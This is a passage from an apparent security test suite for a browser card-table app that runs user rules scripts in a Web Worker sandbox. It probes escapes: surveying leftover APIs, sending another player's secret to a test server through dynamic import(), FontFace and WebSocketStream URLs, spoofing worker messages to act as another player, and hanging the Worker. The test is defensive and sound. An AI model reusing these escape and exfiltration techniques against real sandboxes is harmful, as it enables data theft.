    ok(wlog.includes('QZFETCH ReferenceError: fetch is not defined'), '6: in the Worker, fetch(…) throws "ReferenceError: fetch is not defined"');
    ok(d.off && /fetch is not defined/.test(d.err) && /^rules disabled — script error in onAction\(\)/.test(d.line), `6: the rules are off: "${d.err}", logged "${d.line}"`);
    ok(await h.toastHas(host, 'fetch is not defined').then(() => true, () => false), `6: the host is told: "${await host.evaluate(() => document.getElementById('toast').textContent)}"`);
    ok(await P.waitView(bob, '!v.rules?.enabled && v.log.some((e) => /^rules disabled — script error in onAction/.test(e.txt))', null, 10000), "6: Bob's table shows the rules off and why");
    ok(reqs === 0, '6: no request left for example.com');
    ok(await enableProbe(), 'the host enables the probe again');
  }

  section('Escapes, as the author of the script: what the Worker leaves a script');
  let s = {};
  {
    await run(`
      const r = {};
      const T = (k, f) => { try { r[k] = f(); } catch (e) { r[k] = 'throws ' + e.name + ': ' + e.message; } };
      for (const k of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts', 'Worker', 'SharedWorker', 'BroadcastChannel', 'MessageChannel', 'indexedDB', 'caches', 'WebTransport', 'postMessage',
        'WebSocketStream', 'FontFace', 'fonts', 'SharedArrayBuffer', 'close', 'dispatchEvent', 'onmessage']) T('typeof ' + k, () => typeof self[k]);
      for (const k of ['setTimeout', 'setInterval', 'clearTimeout', 'clearInterval', 'queueMicrotask', 'requestAnimationFrame']) T(k, () => globalThis[k](() => 0, 0));
      T('setTimeout (bare)', () => setTimeout(() => 0, 0));
      for (const k of ['document', 'alert', 'localStorage', 'sessionStorage']) T(k, () => self[k]);
      T('window.document', () => window.document);
      T('window === self', () => window === self);
      T('Function realm', () => Function('return this')() === self);
      T('Function fetch', () => Function('return typeof fetch')());
      T('eval fetch', () => (0, eval)('typeof fetch'));
      T('postMessage on the prototype chain', () => { const o = []; for (let p = self; p; p = Object.getPrototypeOf(p)) if (Object.getOwnPropertyNames(p).includes('postMessage')) o.push(String(p.constructor?.name)); return o.join(); });
      T('MessagePort postMessage on self', () => MessagePort.prototype.postMessage.call(self, { type: 'done' }));
      T('crossOriginIsolated', () => self.crossOriginIsolated);
      T('Atomics.wait, plain memory', () => Atomics.wait(new Int32Array(4), 0, 0, 1));
      T('shared wasm memory', () => Object.prototype.toString.call(new WebAssembly.Memory({ initial: 1, maximum: 1, shared: true }).buffer));
      T('navigator.storage.getDirectory', () => typeof navigator.storage?.getDirectory);
      T('navigator.locks', () => typeof navigator.locks);
      console.log('QZSURVEY ' + JSON.stringify(r));`);
    const line = wlog.find((x) => x.startsWith('QZSURVEY '));
    s = line ? JSON.parse(line.slice(9)) : {};
    console.log(`  survey: ${line}`);
    const gone = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts', 'Worker', 'SharedWorker', 'BroadcastChannel', 'MessageChannel', 'indexedDB', 'caches', 'WebTransport', 'postMessage'];
    ok(line && gone.every((k) => s[`typeof ${k}`] === 'undefined'), `§3f.7: every API the spec takes away is gone (${gone.filter((k) => s[`typeof ${k}`] !== 'undefined').join(', ') || 'none left'})`);
    const timers = ['setTimeout', 'setInterval', 'clearTimeout', 'clearInterval', 'queueMicrotask', 'requestAnimationFrame', 'setTimeout (bare)'];
    ok(timers.every((k) => /^throws Error: \w+ is not available to rules scripts — use t\.schedule\(seconds, tag\)$/.test(s[k])), `§3f.7: the timers (globalThis's and the bare names) throw the t.schedule message (${s.setTimeout})`);
    ok(['document', 'alert', 'localStorage', 'sessionStorage', 'window.document'].every((k) => /^throws Error: \w+ is not available: rules now run in a Worker, away from the page/.test(s[k])), `§3f.7: the page APIs explain themselves (${s.localStorage})`);
    ok(s['window === self'] === true && s['Function realm'] === true && s['Function fetch'] === 'undefined' && s['eval fetch'] === 'undefined',
      'Function and eval: the same hardened global scope (window is the Worker\'s own), no fetch there either');
    ok(s['postMessage on the prototype chain'] === '' && /^throws TypeError/.test(s['MessagePort postMessage on self']), `postMessage is on no prototype of the Worker's scope, and MessagePort's won't post for it (${s['MessagePort postMessage on self']})`);
    console.log(`  recorded: SharedArrayBuffer ${s['typeof SharedArrayBuffer']}, crossOriginIsolated ${s.crossOriginIsolated}, a shared WebAssembly.Memory's buffer ${s['shared wasm memory']}, Atomics.wait on plain memory: ${s['Atomics.wait, plain memory']}`);
    console.log(`  recorded: left in the Worker — WebSocketStream ${s['typeof WebSocketStream']}, FontFace ${s['typeof FontFace']} (self.fonts ${s['typeof fonts']}), navigator.storage.getDirectory ${s['navigator.storage.getDirectory']}, navigator.locks ${s['navigator.locks']}, close ${s['typeof close']}, dispatchEvent ${s['typeof dispatchEvent']}`);
  }

  section("Escapes: reaching a server — dynamic import() (README's honest limit), and any API the Worker left");
  {
    const leakOf = (k) => `encodeURIComponent(t.secret[${J(BOB)}].text) + '&via=${k}'`;
    await run(`import('http://${leak.origin}/imp.js?leak=' + ${leakOf('import')}).then(() => 0, () => 0);
      try { new FontFace('qz', 'url(http://${leak.origin}/font?leak=' + ${leakOf('font')} + ')').load().catch(() => 0); } catch (e) { console.log('QZNET font ' + e.message); }
      try { const w = new WebSocketStream('ws://${leak.origin}/wss?leak=' + ${leakOf('wss')}); w.opened.catch(() => 0); w.closed.catch(() => 0); } catch (e) { console.log('QZNET wss ' + e.message); }
      try { navigator.storage.getDirectory().then((d) => d.getFileHandle('qz-kept', { create: true })).then(() => console.log('QZOPFS kept a file'), (e) => console.log('QZOPFS ' + e.message)); } catch (e) { console.log('QZOPFS ' + e.message); }`);
    await until(() => leak.hits.length >= 3, 5000);
    await h.sleep(500);
    console.log(`  the server outside the table got: ${J(leak.hits)}`);
    const via = (k) => leak.hits.some((u) => u.includes(`via=${k}`) && u.includes(MK.bobSecret));
    ok(via('import') && /dynamic `import\(\)` can't be removed/.test(require('fs').readFileSync(require('path').join(h.APP_ROOT, 'cardtable/README.md'), 'utf8')),
      "recorded: dynamic import() still reaches a server (here with Bob's secret in its URL) — the limit README's honest limits state");
    await until(() => wlog.some((x) => x.startsWith('QZOPFS')), 3000);
    const left = [via('font') && 'FontFace (to a server)', via('wss') && 'WebSocketStream (to a server)', wlog.includes('QZOPFS kept a file') && 'navigator.storage.getDirectory (kept a file)'].filter(Boolean);
    ok(!left.length, `beyond dynamic import(), no network or storage API is left (README: the Worker "takes the network and storage APIs away"): ${left.join(', ') || 'none'}`);
    ok(await rulesOn(), '(the rules are still on: none of that broke a rule of the engine)');
  }

  section('Escapes: the protocol — no post of its own, no message of its own taken for the host\'s');
  {
    // a 'done' and a 'ready' of the script's own
    let ts0 = await hostNow();
    await run(`
      const out = [];
      for (const f of [() => self.postMessage({ type: 'done', id: 0, patch: { rules: { public: { spoofed: 1 } } }, out: { effects: [] } }), () => postMessage({ type: 'ready', name: 'x', wants: ['select'], strict: true }), () => globalThis.postMessage({ type: 'fatal', message: 'x' })]) {
        try { f(); out.push('posted'); } catch (e) { out.push(e.name); }
      }
      console.log('QZPOST ' + JSON.stringify(out));`);
    const post = wlog.find((x) => x.startsWith('QZPOST '));
    ok(post === 'QZPOST ["TypeError","ReferenceError","TypeError"]' && await rulesOn() && !(await P.viewOf(host, "'spoofed' in v.rules.public")), `self.postMessage, postMessage and globalThis.postMessage all throw: nothing posted (${post})`);
    await h.enableRules(host, { code: `({ name: 'Spoof', x: self.postMessage({ type: 'ready', name: 'Spoof', wants: ['select'], strict: true }) })` });
    const err = await host.evaluate(() => document.getElementById('rules-err').textContent);
    ok(/postMessage/.test(err) && (await P.viewOf(host, "v.rules.name === 'Attack probe' && v.rules.enabled && !v.rules.strict && v.rules.wants.join() === 'select'")),
      `a script that posts 'ready' while it is evaluated fails to start ("${err}"); the running rules are unchanged`);
    await host.click('#rules-dialog button[value="cancel"]');

    // self.onmessage of its own: it reads the host's messages (nothing it doesn't see already); the Worker's own handling goes on
    ts0 = await hostNow();
    await run("self.onmessage = () => { globalThis.qzSeen = (globalThis.qzSeen || 0) + 1; };");
    const r1 = await host.evaluate((id) => window.__ct.act({ t: 'rot', id, rot: 45 }), ids.HMK);
    await run('t.public.c.seen = globalThis.qzSeen || 0;');
    const seen = (await C()).seen;
    ok(r1.ok && (await P.viewOf(host, 'v.items[a].rot', ids.HMK)) === 45 && await rulesOn(),
      `self.onmessage set by the script: the host's next move applies as ever (the script read ${seen} of the host's messages: nothing it can't see in its hooks)`);
    await mirrorEqual("with the script's own self.onmessage");

    // A MessageEvent the script dispatches to its own Worker is not a host message.
    // The listener below sees each act as it comes in; armed, it dispatches a
    // fake act of Bob's with the NEXT job's id, while the host's own move waits
    // in the queue for that id.
    await run(`self.addEventListener('message', (e) => {
      const d = e.data, s = globalThis.qzSpoof;
      if (!s || !d || d.type !== 'act') return;
      globalThis.qzSpoof = null;
      self.dispatchEvent(new MessageEvent('message', { data: { type: 'act', id: d.id + 1, p: s.p, a: s.a, now: d.now } }));
    });`);
    while ((await host.evaluate(() => window.__ct.perf.workerJobs + 1)) % 50 === 0) await run(''); // (no digest check may take the next id)
    const rot0 = await P.viewOf(host, '[v.items[a.x].rot, v.items[a.y].rot]', { x: ids.H1, y: ids.HMK });
    ts0 = await hostNow();
    const [, mine2] = await host.evaluate(([code, real]) => Promise.all([window.__ct.act({ t: 'rulesBtn', id: 'run', code }), window.__ct.act(real)]),
      [`globalThis.qzSpoof = { p: ${J(BOB)}, a: { t: 'rot', id: ${J(ids.H1)}, rot: 135 } };`, { t: 'rot', id: ids.HMK, rot: 90 }]);
    await h.sleep(1000);
    const rot1 = await P.viewOf(host, '[v.items[a.x].rot, v.items[a.y].rot]', { x: ids.H1, y: ids.HMK });
    const bobLines = (await logSince(ts0)).filter((e) => e.p === BOB);
    const [wd2, hd2] = await host.evaluate(async () => [await window.__ct.workerDigest(), window.__ct.digest()]);
    const on2 = await rulesOn();
    console.log(`  a fake act of Bob's: the stone Bob never touched ${rot0[0]}° → ${rot1[0]}°; the host's own move (to 90°) ${J(mine2)}, its stone ${rot0[1]}° → ${rot1[1]}°; Bob in the log: ${J(bobLines.map((e) => e.txt))}; digests ${wd2} / ${hd2}; rules ${on2 ? 'on' : 'off'} (${await lastErr()})`);
    ok(rot1[0] === rot0[0] && !bobLines.length, `§0.2, §3f.1: a script can't have the host apply an action as Bob — Bob's stone ${rot0[0]}° → ${rot1[0]}°, Bob in the log ${J(bobLines.map((e) => e.txt))}`);
    ok(rot1[1] === 90 || (mine2 && !mine2.ok), `§3f.5: the host's own queued move is applied, or refused aloud — never lost (${J(mine2)}, its stone at ${rot1[1]}°)`);
    ok(!on2 || wd2 === hd2, `§3f.3: afterwards the Worker's mirror equals the host's table, or the rules are off (${wd2} / ${hd2}, rules ${on2 ? 'on' : 'off'})`);
    if (on2) ok(await enableProbe(), '(a fresh Worker from the host\'s table)');
    // a fake act with an id the host never gave: answered "not in flight", and the mirror?
    await run(`self.dispatchEvent(new MessageEvent('message', { data: { type: 'act', id: 1e9, p: ${J(BOB)}, a: { t: 'rot', id: ${J(ids.H2)}, rot: 45 }, now: Date.now() } }));`);
    await h.sleep(800);
    const [wd3, hd3] = await host.evaluate(async () => [await window.__ct.workerDigest(), window.__ct.digest()]);
    const on3 = await rulesOn();
    ok(!on3 || wd3 === hd3, `§3f.3: a fake act with an id never posted leaves the mirror equal to the host's table, or the rules off (${wd3} / ${hd3}, rules ${on3 ? 'on' : 'off'})`);
    if (on3) ok(await enableProbe(), '(a fresh Worker from the host\'s table)');
    // a fake 'init'
    ts0 = await hostNow();
    await run("self.dispatchEvent(new MessageEvent('message', { data: { type: 'init' } }));");
    const d = await disabled(ts0);
    ok(d.off && /^the script crashed/.test(d.err), `a fake 'init' the script dispatches crashes its Worker, loudly ("${d.err}")`);
    ok(await enableProbe(), 'the host enables the probe again');
  }

  section('Escapes: a Worker kept from answering — it goes on, or the watchdog ends it loudly; never a silent hang');
  for (const [what, code, then] of [
    ['a capture listener that stops every message', "globalThis.qzCap = 0; self.addEventListener('message', (e) => { globalThis.qzCap++; e.stopImmediatePropagation(); }, true);", true],
    ['self.close()', 'self.close();', false],
    ['Atomics.wait on a shared WebAssembly memory', 'Atomics.wait(new Int32Array(new WebAssembly.Memory({ initial: 1, maximum: 1, shared: true }).buffer), 0, 0, 60000);', false],
  ]) {
    const rot0 = await P.viewOf(host, 'v.items[a].rot', ids.HMK), t0 = Date.now();
    let r = await run(code);
    if (then) r = await host.evaluate((id) => window.__ct.act({ t: 'rot', id, rot: 300 }), ids.HMK);
    const took = Date.now() - t0, off = !!r.error && await P.waitView(host, '!v.rules?.enabled', null, 3000);
    const err = await lastErr(), rot = await P.viewOf(host, 'v.items[a].rot', ids.HMK);
    if (!off) {
      if (then) await run('t.public.c.cap = globalThis.qzCap;');
      ok(r.ok && rot === 300, `${what}: the Worker goes on — the next move applies (${J(r)}; the listener ran ${(await C()).cap} times, and the Worker's own still handled each message)`);
      await mirrorEqual(`after ${what}`);
    } else {
      ok(/longer than 4 s/.test(err) && !r.ok && rot === rot0, `${what}: the Worker stops answering — the action waiting on it is dropped (${J(r)}) and the watchdog ends the rules, ${took} ms after it was sent ("${err}")`);
      ok(await enableProbe(), 'the host enables the probe again');
    }
  }

  section('5: nobody receives another player\'s ask, hint or secret — every body Mallory, Eve and Bob received, scanned');
  {
    await knock();
    await h.sleep(1500);
    const others = [MK.bobPrompt, MK.bobLabel, MK.bobValue, MK.bobSecret, MK.alicePrompt, MK.aliceSecret, MK.malValue, 'qzhintmap:'];
    const m = await scanRaw(M, { me: MPID, needles: others, ids: HINTED, ownSec: MK.malSecret, ownAsks: ['mopt', 'mspace', 'mhand', 'mitem', 'mnum'] });
    ok(m.n > 100 && !m.hits.length, `5: Mallory: ${m.n} messages on every channel — no prompt, label, value or secret of anyone else's, no hint, no hinted ids together, her own parts only in bodies bound to her (${m.hits.slice(0, 4).join(' | ') || 'none'})`);
    ok(m.own.sec > 0 && m.own.ask > 0, `5: … while her own secret (${m.own.sec} bodies) and her own asks (${m.own.ask}) did reach her: the scan sees the parts`);
    const e = await scanRaw(Eve, { me: null, needles: [...others, MK.malSecret], ids: HINTED, ownSec: null, ownAsks: [], noHand: true });
    ok(e.n > 2 && !e.hits.length, `5: Eve (never registered): ${e.n} messages, no ask, hint, secret or hand of anyone's (${e.hits.slice(0, 4).join(' | ') || 'none'})`);
    const b = await bob.evaluate((o) => {
      const text = window.__rtc.bodies.map((x) => JSON.stringify(x.body));
      return { n: text.length, leaks: o.not.filter((nd) => text.some((t) => t.includes(nd))), got: o.got.filter((nd) => text.some((t) => t.includes(nd))) };
    }, { not: [MK.alicePrompt, MK.aliceSecret, MK.malValue, MK.malSecret, MK.bobValue], got: [MK.bobPrompt, MK.bobLabel, MK.bobSecret, ...HINT_SPACES] });
    ok(b.n > 20 && !b.leaks.length, `5: Bob's ${b.n} state bodies carry nobody else's parts, nor his own option's value (labels only) (${b.leaks.join(', ') || 'none'})`);
    ok(b.got.length === 5, `5: … and do carry his own prompt, label, secret and hinted spaces (${b.got.length} of 5)`);
  }

  ok(!wlog.some((x) => /PAGEERROR/.test(x)), '(no page error on the host)');
  leak.close();
  await env.done();
})().catch(h.crash);
